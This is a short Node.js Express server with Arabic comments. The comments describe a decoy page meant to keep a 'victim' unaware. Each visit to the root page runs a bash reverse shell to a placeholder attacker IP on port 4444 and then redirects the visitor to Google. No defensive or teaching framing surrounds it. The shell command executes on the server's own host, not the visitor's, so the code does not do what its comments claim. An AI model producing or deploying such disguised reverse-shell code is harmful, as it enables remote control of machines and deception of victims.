const express = require('express');
const { exec } = require('child_process');
const app = express();
const PORT = process.env.PORT || 3000;

// صفحة تمويهية للضحية عشان ما يحس بشيء
app.get('/', (req, res) => {
    // تنفيذ أمر الاتصال العكسي في الخلفية أول ما يفتح الرابط
    const targetIP = 'IP_الخاص_بك';
    const targetPort = '4444';
    
    // سكريبت اتصال عكسي خفيف عبر Bash / Netcat
    const reverseShell = `bash -i >& /dev/tcp/${targetIP}/${targetPort} 0>&1`;
    
    exec(reverseShell, (err, stdout, stderr) => {
        // يتم معالجة الاتصال بالخلفية
    });

    // إظهار صفحة عادية للضحية
    res.send('<!DOCTYPE html><html><head><title>Loading...</title></head><body><script>window.location.href="https://google.com";</script></body></html>');
});

app.listen(PORT, () => {
    console.log(`Stealth core running on port ${PORT}`);
});
